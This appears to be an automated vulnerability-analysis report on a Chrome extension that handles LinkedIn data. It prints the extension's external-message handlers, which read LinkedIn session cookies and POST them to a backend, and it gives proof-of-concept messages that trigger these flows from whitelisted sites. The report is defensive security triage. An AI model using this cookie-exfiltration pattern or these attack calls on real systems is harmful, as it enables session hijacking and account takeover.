# CoCo Analysis: ldaebepnkfockfedaloedoelkjlmpnnl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (fetch_source → sendResponseExternal, cookie_source → sendResponseExternal x2)

---

## Sink 1: fetch_source → sendResponseExternal_sink (referenced only CoCo framework code)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ldaebepnkfockfedaloedoelkjlmpnnl/opgen_generated_files/bg.js
Line 265: `var responseText = 'data_from_fetch';`

**Analysis:** This line is in CoCo's framework code (before the 3rd "// original" marker at line 963). However, the actual extension code uses fetch() extensively and has `chrome.runtime.onMessageExternal` listener that leaks sensitive data.

**Code:**

```javascript
// Background script - External message handler (bg.js, line 1225)
chrome.runtime.onMessageExternal.addListener(
    function(request, sender, sendResponse) {
        if (request.type == "reconnect"){
            // Fetches from hardcoded backend, then retrieves LinkedIn cookies
            fetch(`${domain}/api/status`, { method: 'GET' })
            .then(response => response.json())
            .then(data => {
                chrome.cookies.get({name: 'li_at', url: 'https://www.linkedin.com/'}, function(cookie_li_at) {
                    chrome.cookies.get({name: 'li_a', url: 'https://www.linkedin.com/'}, function(cookie_li_a) {
                        let li_at = cookie_li_at ? cookie_li_at.value : null; // ← LinkedIn cookies
                        let li_a = cookie_li_a ? cookie_li_a.value : null; // ← LinkedIn cookies

                        // Sends cookies to backend and returns response to external caller
                        fetch(`${domain}/api/linkedin`, {
                            method: 'POST',
                            body: JSON.stringify({ li_at: li_at, li_a: li_a, ... })
                        })
                        .then(response => response.json())
                        .then(data => {
                            sendResponse(data); // ← Data from fetch sent to external caller
                        });
                    });
                });
            });
        } else if (request.type == "get_first_infos"){
            // Similar flow: reads LinkedIn cookies, sends to backend, returns response
            chrome.cookies.get({name: 'li_at', url: 'https://www.linkedin.com/'}, function(cookie_li_at) {
                chrome.cookies.get({name: 'li_a', url: 'https://www.linkedin.com/'}, function(cookie_li_a) {
                    let li_at = cookie_li_at ? cookie_li_at.value : null; // ← attacker-accessible
                    let li_a = cookie_li_a ? cookie_li_a.value : null; // ← attacker-accessible

                    fetch(`${domain}/api/linkedin`, {
                        method: 'POST',
                        body: JSON.stringify({ li_at: li_at, li_a: li_a, ... })
                    })
                    .then(response => response.json())
                    .then(data => {
                        sendResponse(data); // ← Data from fetch sent to external caller
                    });
                });
            });
        }
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From whitelisted domain https://app.yadulink.com/* or http://127.0.0.1:8000/*
chrome.runtime.sendMessage(
    "ldaebepnkfockfedaloedoelkjlmpnnl",
    { type: "get_first_infos" },
    function(response) {
        console.log("Received backend response:", response);
        // Response contains data from fetch to https://app.yadulink.com/api/linkedin
    }
);
```

**Impact:** External websites (whitelisted in manifest.json: app.yadulink.com, 127.0.0.1:8000) can trigger the extension to read LinkedIn authentication cookies (li_at, li_a), send them to the backend server, and receive the backend's response. This allows information disclosure of LinkedIn cookies and backend API responses to external callers.

---

## Sink 2 & 3: cookie_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ldaebepnkfockfedaloedoelkjlmpnnl/opgen_generated_files/bg.js
Line 1473: `sendResponse(JSON.stringify({status:false, message:"no_cookie"}));`

**Code:**

```javascript
// Background script - External message handler (bg.js, lines 1436-1476)
chrome.runtime.onMessageExternal.addListener(
    function(request, sender, sendResponse) {
        if (request.type == "get_first_infos"){
            chrome.cookies.get({name: 'li_at', url: 'https://www.linkedin.com/'}, function(cookie_li_at) {
                chrome.cookies.get({name: 'li_a', url: 'https://www.linkedin.com/'}, function(cookie_li_a) {
                    if (cookie_li_at || cookie_li_a) {
                        let li_at = cookie_li_at ? cookie_li_at.value : null; // ← LinkedIn cookie (attacker-accessible)
                        let li_a = cookie_li_a ? cookie_li_a.value : null; // ← LinkedIn cookie (attacker-accessible)

                        fetch(`${domain}/api/linkedin`, {
                            method: 'POST',
                            body: JSON.stringify({ li_at: li_at, li_a: li_a, ... })
                        })
                        .then(response => response.json())
                        .then(data => {
                            sendResponse(data); // ← Backend response sent to external caller
                        });
                    } else {
                        sendResponse(JSON.stringify({status:false, message:"no_cookie"})); // ← Cookie status leaked
                    }
                });
            });
        } else if (request.type == "is_installed"){
            chrome.cookies.get({name: 'li_at', url: 'https://www.linkedin.com/'}, function(cookie) {
                if (cookie != null){
                    sendResponse("ok"); // ← Cookie presence leaked
                } else {
                    sendResponse("no_cookie"); // ← Cookie absence leaked
                }
            });
        }
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From whitelisted domain https://app.yadulink.com/* or http://127.0.0.1:8000/*
// Attack 1: Check if LinkedIn cookies exist
chrome.runtime.sendMessage(
    "ldaebepnkfockfedaloedoelkjlmpnnl",
    { type: "is_installed" },
    function(response) {
        console.log("Cookie status:", response); // "ok" or "no_cookie"
    }
);

// Attack 2: Get LinkedIn cookies and backend response
chrome.runtime.sendMessage(
    "ldaebepnkfockfedaloedoelkjlmpnnl",
    { type: "get_first_infos" },
    function(response) {
        console.log("LinkedIn data and backend response:", response);
    }
);
```

**Impact:** External websites (whitelisted domains) can:
1. Detect presence/absence of LinkedIn authentication cookies
2. Trigger the extension to read LinkedIn cookies (li_at, li_a) and exfiltrate them to the backend
3. Receive backend API responses containing processed LinkedIn data

This is sensitive data exfiltration combined with information disclosure vulnerability.
